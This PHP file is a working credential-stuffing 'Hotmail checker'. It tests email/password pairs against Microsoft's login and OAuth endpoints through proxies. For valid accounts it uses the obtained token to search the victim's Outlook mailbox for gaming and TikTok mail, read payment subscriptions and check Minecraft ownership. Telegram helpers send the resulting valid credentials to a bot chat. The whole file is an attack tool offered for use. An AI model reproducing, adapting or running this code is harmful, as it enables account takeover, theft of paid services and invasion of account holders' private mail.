<?php
/**
 * HOTMAIL Checker v2.0 - PHP Proxy
 * 100% Fixed - logic matched to hatmil.py (working Python reference)
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['error' => 'POST only']);
    exit();
}

$input = json_decode(file_get_contents('php://input'), true);
$action = isset($input['action']) ? $input['action'] : '';

switch ($action) {
    case 'ping':
        echo json_encode(['ok' => true, 'pong' => true]);
        break;
    case 'check':
        doCheck($input);
        break;
    case 'telegram_message':
        telegramSendMessage($input);
        break;
    case 'telegram_text':
        telegramSendText($input);
        break;
    case 'telegram_document':
        telegramSendDocument($input);
        break;
    default:
        echo json_encode(['error' => 'Unknown action: ' . $action]);
}

// ─────────────────────────────────────────────────────────────────────────────
// HTTP HELPER
// ─────────────────────────────────────────────────────────────────────────────
function makeRequest($url, $method = 'GET', $headers = [], $body = null, &$cookies = [], $followRedirect = true, $proxy = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 25);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $followRedirect);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($body !== null) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
    }

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    if (!empty($cookies)) {
        $cookieStr = '';
        foreach ($cookies as $k => $v) {
            $cookieStr .= "$k=$v; ";
        }
        curl_setopt($ch, CURLOPT_COOKIE, rtrim($cookieStr, '; '));
    }

    curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $header) use (&$cookies) {
        if (stripos($header, 'Set-Cookie:') === 0) {
            $cookiePart = trim(substr($header, 11));
            $parts = explode(';', $cookiePart);
            $kv = explode('=', trim($parts[0]), 2);
            if (count($kv) === 2) {
                $cookies[trim($kv[0])] = trim($kv[1]);
            }
        }
        return strlen($header);
    });

    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    }

    $response   = curl_exec($ch);
    $httpCode   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $finalUrl   = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);

    if ($response === false) {
        return ['status' => 0, 'body' => '', 'headers' => '', 'location' => '', 'url' => $url];
    }

    $responseHeaders = substr($response, 0, $headerSize);
    $responseBody    = substr($response, $headerSize);

    $location = '';
    if (preg_match('/^Location:\s*(.+)$/mi', $responseHeaders, $m)) {
        $location = trim($m[1]);
    }

    return [
        'status'   => $httpCode,
        'body'     => $responseBody,
        'headers'  => $responseHeaders,
        'location' => $location,
        'url'      => $finalUrl,
    ];
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN CHECK FUNCTION  (logic exactly mirrors hatmil.py UnifiedChecker.check)
// ─────────────────────────────────────────────────────────────────────────────
function doCheck($input) {
    $email     = isset($input['email'])     ? trim($input['email'])    : '';
    $password  = isset($input['password'])  ? trim($input['password']) : '';
    $checkMode = isset($input['checkMode']) ? $input['checkMode']      : 'all';
    $proxy     = isset($input['proxy'])     ? $input['proxy']          : null;

    if (!$email || !$password) {
        echo json_encode(['status' => 'ERROR', 'reason' => 'Missing credentials']);
        return;
    }

    $cookies = [];

    // ── Step 1: HRD check ──────────────────────────────────────────────────
    // hatmil.py: url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
    $hrdUrl = 'https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=' . urlencode($email);
    $r1 = makeRequest($hrdUrl, 'GET', [
        'X-OneAuth-AppName: Outlook Lite',
        'X-Office-Version: 3.11.0-minApi24',
        'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)',
        'Host: odc.officeapps.live.com',
        'Connection: Keep-Alive',
        'Accept-Encoding: gzip',
    ], null, $cookies, true, $proxy);

    $hrdBody = $r1['body'];
    // hatmil.py: if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text: BAD
    if (strpos($hrdBody, 'Neither') !== false || strpos($hrdBody, 'Both') !== false ||
        strpos($hrdBody, 'Placeholder') !== false || strpos($hrdBody, 'OrgId') !== false) {
        echo json_encode(['status' => 'BAD', 'reason' => 'Not MSAccount']);
        return;
    }
    // hatmil.py: if "MSAccount" not in r1.text: BAD
    if (strpos($hrdBody, 'MSAccount') === false) {
        echo json_encode(['status' => 'BAD', 'reason' => 'Not MSAccount']);
        return;
    }

    usleep(300000); // 0.3s like hatmil.py time.sleep(0.3)

    // ── Step 2: Get OAuth form ─────────────────────────────────────────────
    // hatmil.py: url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?..."
    $authUrl = 'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?' .
        'client_info=1&haschrome=1&login_hint=' . urlencode($email) . '&mkt=en' .
        '&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59' .
        '&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access' .
        '&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D';

    $r2 = makeRequest($authUrl, 'GET', [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.9',
        'Connection: keep-alive',
    ], null, $cookies, true, $proxy);

    $r2body = $r2['body'];

    // ── FIXED: urlPost regex — matches hatmil.py: re.search(r'urlPost":"([^"]+)"', r2.text)
    $postUrl = '';
    if (preg_match('/urlPost":"([^"]+)"/', $r2body, $urlMatch)) {
        $postUrl = $urlMatch[1];
    } elseif (preg_match("/urlPost':'([^']+)'/", $r2body, $urlMatch)) {
        $postUrl = $urlMatch[1];
    } elseif (preg_match('/["\']urlPost["\']\s*:\s*["\']((?:[^"\'\\\\]|\\\\.)*)["\']/s', $r2body, $urlMatch)) {
        $postUrl = $urlMatch[1];
    }

    if (!$postUrl) {
        echo json_encode(['status' => 'BAD', 'reason' => 'No urlPost']);
        return;
    }

    // ── FIXED: PPFT regex — matches hatmil.py:
    // re.search(r'name=\"PPFT\" id=\"i0327\" value=\"([^"]+)"', r2.text)
    $ppft = '';
    // Primary pattern: exactly like hatmil.py
    if (preg_match('/name="PPFT"\s+id="i0327"\s+value="([^"]+)"/', $r2body, $ppftMatch)) {
        $ppft = $ppftMatch[1];
    } elseif (preg_match('/name="PPFT"[^>]*value="([^"]+)"/', $r2body, $ppftMatch)) {
        $ppft = $ppftMatch[1];
    } elseif (preg_match('/value="([^"]+)"[^>]*name="PPFT"/', $r2body, $ppftMatch)) {
        $ppft = $ppftMatch[1];
    } elseif (preg_match('/sFT\s*=\s*["\']((?:[^"\'\\\\]|\\\\.)*)["\']/s', $r2body, $ppftMatch)) {
        $ppft = $ppftMatch[1];
    }

    if (!$ppft) {
        echo json_encode(['status' => 'BAD', 'reason' => 'No PPFT']);
        return;
    }

    // Fix escaped slashes in postUrl (hatmil.py: post_url.replace("\\/", "/"))
    $postUrl = str_replace('\\/', '/', $postUrl);

    // ── Step 3: POST login ─────────────────────────────────────────────────
    // hatmil.py sends many more fields than old checker.php — FIXED to match exactly
    $loginData =
        'i13=1' .
        '&login='            . urlencode($email) .
        '&loginfmt='         . urlencode($email) .
        '&type=11' .
        '&LoginOptions=1' .
        '&lrt=' .
        '&lrtPartition=' .
        '&hisRegion=' .
        '&hisScaleUnit=' .
        '&passwd='           . urlencode($password) .
        '&ps=2' .
        '&psRNGCDefaultType=' .
        '&psRNGCEntropy=' .
        '&psRNGCSLK=' .
        '&canary=' .
        '&ctx=' .
        '&hpgrequestid=' .
        '&PPFT='             . urlencode($ppft) .
        '&PPSX=PassportR' .
        '&NewUser=1' .
        '&FoundMSAs=' .
        '&fspost=0' .
        '&i21=0' .
        '&CookieDisclosure=0' .
        '&IsFidoSupported=0' .
        '&isSignupPost=0' .
        '&isRecoveryAttemptPost=0' .
        '&i19=9960';

    $r3 = makeRequest($postUrl, 'POST', [
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Origin: https://login.live.com',
        'Referer: ' . $r2['url'],
    ], $loginData, $cookies, false, $proxy);

    $r3body  = $r3['body'];
    $r3lower = strtolower($r3body);
    $location = $r3['location'];

    // hatmil.py bad check: "account or password is incorrect" OR r3.text.count("error") > 0
    if (strpos($r3lower, 'account or password is incorrect') !== false ||
        substr_count($r3lower, 'error') > 0) {
        echo json_encode(['status' => 'BAD', 'reason' => 'Wrong credentials']);
        return;
    }

    // hatmil.py 2FA check #1: "https://account.live.com/identity/confirm" OR "identity/confirm"
    if (strpos($r3body, 'https://account.live.com/identity/confirm') !== false ||
        strpos($r3lower, 'identity/confirm') !== false) {
        echo json_encode(['status' => '2FA', 'email' => $email, 'password' => $password]);
        return;
    }

    // hatmil.py 2FA check #2: "https://account.live.com/Consent" OR "consent"
    if (strpos($r3body, 'https://account.live.com/Consent') !== false ||
        strpos($r3lower, 'consent') !== false) {
        echo json_encode(['status' => '2FA', 'email' => $email, 'password' => $password]);
        return;
    }

    // hatmil.py abuse check
    if (strpos($r3body, 'https://account.live.com/Abuse') !== false ||
        strpos($r3body, 'Abuse') !== false) {
        echo json_encode(['status' => 'BAD', 'reason' => 'Abuse']);
        return;
    }

    // hatmil.py: if not location: BAD
    if (!$location) {
        echo json_encode(['status' => 'BAD', 'reason' => 'No redirect location']);
        return;
    }

    // hatmil.py: code_match = re.search(r'code=([^&]+)', location)
    if (!preg_match('/code=([^&]+)/', $location, $codeMatch)) {
        echo json_encode(['status' => 'BAD', 'reason' => 'No code in redirect']);
        return;
    }

    $code = $codeMatch[1];

    // hatmil.py: mspcid = self.session.cookies.get("MSPCID", "")
    // Look for MSPCID in cookies (case-insensitive)
    $mspcid = '';
    foreach ($cookies as $k => $v) {
        if (strtoupper($k) === 'MSPCID') {
            $mspcid = strtoupper($v);
            break;
        }
    }
    if (!$mspcid) {
        echo json_encode(['status' => 'BAD', 'reason' => 'No MSPCID cookie']);
        return;
    }
    $cid = $mspcid;

    // ── Step 4: Exchange code for token ───────────────────────────────────
    $tokenData =
        'client_info=1' .
        '&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59' .
        '&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D' .
        '&grant_type=authorization_code' .
        '&code=' . urlencode($code) .
        '&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access';

    $emptyCookies = [];
    $r4 = makeRequest('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'POST', [
        'Content-Type: application/x-www-form-urlencoded',
    ], $tokenData, $emptyCookies, true, $proxy);

    $tokenJson = json_decode($r4['body'], true);
    if (!isset($tokenJson['access_token'])) {
        echo json_encode(['status' => 'BAD', 'reason' => 'No access_token']);
        return;
    }

    $accessToken = $tokenJson['access_token'];

    // ── Step 5: Service checks ─────────────────────────────────────────────
    $result = [
        'status'   => 'HIT',
        'email'    => $email,
        'password' => $password,
    ];

    if (in_array($checkMode, ['microsoft', 'all'])) {
        $ms = checkMicrosoftSubscriptions($accessToken, $cid, $cookies, $proxy);
        $result['msStatus']      = $ms['status'];
        $result['subscriptions'] = $ms['subscriptions'];
    }

    if (in_array($checkMode, ['psn', 'all'])) {
        $psn = checkOutlookService($accessToken, $cid,
            'sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation',
            50, $cookies, $proxy);
        $result['psnStatus'] = $psn['total'] > 0 ? 'HAS_ORDERS' : 'FREE';
        $result['psnOrders'] = $psn['total'];
    }

    if (in_array($checkMode, ['steam', 'all'])) {
        $steam = checkOutlookService($accessToken, $cid,
            'noreply@steampowered.com OR steam',
            50, $cookies, $proxy);
        $result['steamStatus'] = $steam['total'] > 0 ? 'HAS_PURCHASES' : 'FREE';
        $result['steamCount']  = $steam['total'];
    }

    if (in_array($checkMode, ['supercell', 'all'])) {
        $sc = checkSupercell($accessToken, $cid, $cookies, $proxy);
        $result['supercellStatus'] = count($sc) > 0 ? 'HAS_GAMES' : 'FREE';
        $result['supercellGames']  = $sc;
    }

    if (in_array($checkMode, ['tiktok', 'all'])) {
        $tt = checkOutlookService($accessToken, $cid,
            'TikTok OR tiktok.com',
            10, $cookies, $proxy);
        $result['tiktokStatus']   = 'FREE';
        $result['tiktokUsername'] = null;
        if ($tt['username']) {
            $result['tiktokStatus']   = 'FOUND';
            $result['tiktokUsername'] = $tt['username'];
        }
    }

    if (in_array($checkMode, ['minecraft', 'all'])) {
        $mc = checkMinecraft($accessToken, $proxy);
        $result['minecraftStatus']   = $mc['status'];
        $result['minecraftUsername'] = $mc['username'];
        $result['minecraftUuid']     = $mc['uuid'];
    }

    echo json_encode($result);
}

// ─────────────────────────────────────────────────────────────────────────────
// OUTLOOK SEARCH  (mirrors hatmil.py's check_psn / check_steam / check_tiktok)
// ─────────────────────────────────────────────────────────────────────────────
function outlookSearch($accessToken, $cid, $query, $size, &$cookies, $proxy) {
    $uuid    = generateUUID();
    $payload = json_encode([
        'Cvid'            => $uuid,
        'Scenario'        => ['Name' => 'owa.react'],
        'TimeZone'        => 'UTC',
        'TextDecorations' => 'Off',
        'EntityRequests'  => [[
            'EntityType'     => 'Conversation',
            'ContentSources' => ['Exchange'],
            'Filter'         => ['Or' => [['Term' => ['DistinguishedFolderName' => 'msgfolderroot']]]],
            'From'           => 0,
            'Query'          => ['QueryString' => $query],
            'Size'           => $size,
            'Sort'           => [['Field' => 'Time', 'SortDirection' => 'Desc']],
        ]]
    ]);

    $emptyCookies = [];
    $r = makeRequest('https://outlook.live.com/search/api/v2/query', 'POST', [
        'User-Agent: Outlook-Android/2.0',
        'Accept: application/json',
        'Authorization: Bearer ' . $accessToken,
        'X-AnchorMailbox: CID:' . $cid,
        'Content-Type: application/json',
    ], $payload, $emptyCookies, true, $proxy);

    return json_decode($r['body'], true);
}

// Unified service check (PSN / Steam / TikTok) — mirrors hatmil.py check_psn + check_tiktok
function checkOutlookService($accessToken, $cid, $query, $size, &$cookies, $proxy) {
    $data     = outlookSearch($accessToken, $cid, $query, $size, $cookies, $proxy);
    $total    = 0;
    $username = null;

    if (isset($data['EntitySets'][0]['ResultSets'][0])) {
        $rs    = $data['EntitySets'][0]['ResultSets'][0];
        $total = isset($rs['Total']) ? (int)$rs['Total'] : 0;

        // TikTok username extraction (hatmil.py: re.search(r'@([a-zA-Z0-9_.]{2,24})', preview))
        if (isset($rs['Results'])) {
            foreach (array_slice($rs['Results'], 0, 3) as $res) {
                $preview = isset($res['Preview']) ? $res['Preview'] : '';
                if (preg_match('/@([a-zA-Z0-9_.]{2,24})/', $preview, $m)) {
                    $username = $m[1];
                    break;
                }
            }
        }
    }

    return ['total' => $total, 'username' => $username];
}

function checkSupercell($accessToken, $cid, &$cookies, $proxy) {
    $games = ['Clash of Clans', 'Clash Royale', 'Brawl Stars', 'Hay Day', 'Boom Beach'];
    $found = [];
    foreach ($games as $game) {
        $data = outlookSearch($accessToken, $cid, $game, 5, $cookies, $proxy);
        if (isset($data['EntitySets'])) {
            foreach ($data['EntitySets'] as $es) {
                foreach ((isset($es['ResultSets']) ? $es['ResultSets'] : []) as $rs) {
                    if (isset($rs['Total']) && $rs['Total'] > 0) {
                        $found[] = $game;
                        break 2;
                    }
                }
            }
        }
        usleep(200000); // 0.2s like hatmil.py
    }
    return $found;
}

function checkMicrosoftSubscriptions($accessToken, $cid, &$cookies, $proxy) {
    $userId    = substr(str_replace('-', '', generateUUID()), 0, 16);
    $stateJson = json_encode(['userId' => $userId, 'scopeSet' => 'pidl']);
    $payUrl    = 'https://login.live.com/oauth20_authorize.srf?' .
        'client_id=000000000004773A&response_type=token' .
        '&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete' .
        '&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth' .
        '&state=' . urlencode($stateJson) . '&prompt=none';

    $r = makeRequest($payUrl, 'GET', [
        'Host: login.live.com',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept: text/html,application/xhtml+xml',
        'Accept-Language: en-US,en;q=0.5',
        'Connection: keep-alive',
        'Referer: https://account.microsoft.com/',
    ], null, $cookies, true, $proxy);

    $paymentToken = null;
    $searchText   = $r['body'] . ' ' . $r['url'];

    // hatmil.py token_patterns: access_token= or "access_token":"..."
    if (preg_match('/access_token=([^&\s"\']+)/', $searchText, $m)) {
        $paymentToken = urldecode($m[1]);
    } elseif (preg_match('/"access_token":"([^"]+)"/', $searchText, $m)) {
        $paymentToken = $m[1];
    }

    $subscriptions = [];

    if ($paymentToken) {
        $payHeaders = [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept: application/json',
            'Authorization: MSADELEGATE1.0="' . $paymentToken . '"',
            'Content-Type: application/json',
            'Host: paymentinstruments.mp.microsoft.com',
            'ms-cV: ' . generateUUID(),
            'Origin: https://account.microsoft.com',
            'Referer: https://account.microsoft.com/',
        ];
        $emptyCookies = [];
        $transUrl = 'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions';
        $rt = makeRequest($transUrl, 'GET', $payHeaders, null, $emptyCookies, true, $proxy);

        if ($rt['status'] === 200) {
            $responseText = $rt['body'];
            $keywords = [
                'Xbox Game Pass Ultimate' => 'GAME PASS ULTIMATE',
                'PC Game Pass'            => 'PC GAME PASS',
                'Xbox Game Pass'          => 'GAME PASS',
                'EA Play'                 => 'EA PLAY',
                'Xbox Live Gold'          => 'XBOX LIVE GOLD',
                'Microsoft 365 Family'    => 'M365 FAMILY',
                'Microsoft 365 Personal'  => 'M365 PERSONAL',
                'Office 365'              => 'OFFICE 365',
                'OneDrive'                => 'ONEDRIVE',
            ];
            foreach ($keywords as $keyword => $type) {
                if (strpos($responseText, $keyword) !== false) {
                    $sub = ['name' => $type];
                    if (preg_match('/"nextRenewalDate"\s*:\s*"([^T"]+)/', $responseText, $rm)) {
                        $sub['renewal_date'] = $rm[1];
                    }
                    if (preg_match('/"autoRenew"\s*:\s*(true|false)/', $responseText, $am)) {
                        $sub['auto_renew'] = $am[1] === 'true' ? 'YES' : 'NO';
                    }
                    $subscriptions[] = $sub;
                }
            }
        }
    }

    // hatmil.py: active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
    // If subscriptions exist, PREMIUM; else FREE
    return [
        'status'        => count($subscriptions) > 0 ? 'PREMIUM' : 'FREE',
        'subscriptions' => $subscriptions,
    ];
}

function checkMinecraft($accessToken, $proxy) {
    $emptyCookies = [];
    $r = makeRequest('https://api.minecraftservices.com/minecraft/profile', 'GET', [
        'Authorization: Bearer ' . $accessToken,
    ], null, $emptyCookies, true, $proxy);

    $data = json_decode($r['body'], true);
    if ($r['status'] === 200 && isset($data['name'])) {
        return [
            'status'   => 'OWNED',
            'username' => $data['name'],
            'uuid'     => isset($data['id']) ? $data['id'] : '',
        ];
    }
    return ['status' => 'FREE', 'username' => null, 'uuid' => ''];
}

// ─────────────────────────────────────────────────────────────────────────────
// TELEGRAM HELPERS
// ─────────────────────────────────────────────────────────────────────────────
function telegramSendMessage($input) {
    $token  = isset($input['token'])  ? $input['token']  : '';
    $chatId = isset($input['chatId']) ? $input['chatId'] : '';
    $text   = isset($input['text'])   ? $input['text']   : '';

    if (!$token || !$chatId) {
        echo json_encode(['ok' => false, 'error' => 'Missing token/chatId']);
        return;
    }

    $emptyCookies = [];
    $payload = json_encode([
        'chat_id'    => $chatId,
        'text'       => $text,
        'parse_mode' => 'HTML',
    ]);

    $r    = makeRequest("https://api.telegram.org/bot{$token}/sendMessage", 'POST', [
        'Content-Type: application/json',
    ], $payload, $emptyCookies);

    $resp = json_decode($r['body'], true);
    echo json_encode(['ok' => isset($resp['ok']) ? $resp['ok'] : false]);
}

function telegramSendText($input) {
    $token    = isset($input['token'])    ? $input['token']    : '';
    $chatId   = isset($input['chatId'])   ? $input['chatId']   : '';
    $filename = isset($input['filename']) ? $input['filename'] : 'results.txt';
    $content  = isset($input['content'])  ? $input['content']  : '';

    if (!$token || !$chatId) {
        echo json_encode(['ok' => false]);
        return;
    }

    $lines = array_filter(explode("\n", $content), function($l) {
        return trim($l) && strpos(trim($l), '#') !== 0;
    });
    $lines = array_values($lines);

    if (empty($lines)) {
        echo json_encode(['ok' => true]);
        return;
    }

    $chunkSize = 50;
    $ok = true;
    for ($i = 0; $i < count($lines); $i += $chunkSize) {
        $chunk   = array_slice($lines, $i, $chunkSize);
        $msgText = "📄 <b>{$filename}</b>\n\n<code>" . implode("\n", $chunk) . "</code>";

        $emptyCookies = [];
        $payload = json_encode([
            'chat_id'    => $chatId,
            'text'       => $msgText,
            'parse_mode' => 'HTML',
        ]);

        $r = makeRequest("https://api.telegram.org/bot{$token}/sendMessage", 'POST', [
            'Content-Type: application/json',
        ], $payload, $emptyCookies);

        $resp = json_decode($r['body'], true);
        if (!isset($resp['ok']) || !$resp['ok']) $ok = false;
        usleep(1000000);
    }

    echo json_encode(['ok' => $ok]);
}

/**
 * Send file as actual Telegram document (sendDocument) — matches hatmil.py send_document()
 */
function telegramSendDocument($input) {
    $token    = isset($input['token'])    ? $input['token']    : '';
    $chatId   = isset($input['chatId'])   ? $input['chatId']   : '';
    $filename = isset($input['filename']) ? $input['filename'] : 'results.txt';
    $content  = isset($input['content'])  ? $input['content']  : '';
    $caption  = isset($input['caption'])  ? $input['caption']  : '';

    if (!$token || !$chatId) {
        echo json_encode(['ok' => false, 'error' => 'Missing token/chatId']);
        return;
    }

    // Write content to temp file
    $tmpFile = sys_get_temp_dir() . '/' . $filename;
    file_put_contents($tmpFile, $content);

    $url = "https://api.telegram.org/bot{$token}/sendDocument";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id'    => $chatId,
        'caption'    => $caption,
        'parse_mode' => 'HTML',
        'document'   => new CURLFile($tmpFile, 'text/plain', $filename),
    ]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);

    $response = curl_exec($ch);
    curl_close($ch);

    @unlink($tmpFile);

    $resp = json_decode($response, true);
    echo json_encode(['ok' => isset($resp['ok']) ? $resp['ok'] : false]);
}

// ─────────────────────────────────────────────────────────────────────────────
// UUID GENERATOR
// ─────────────────────────────────────────────────────────────────────────────
function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}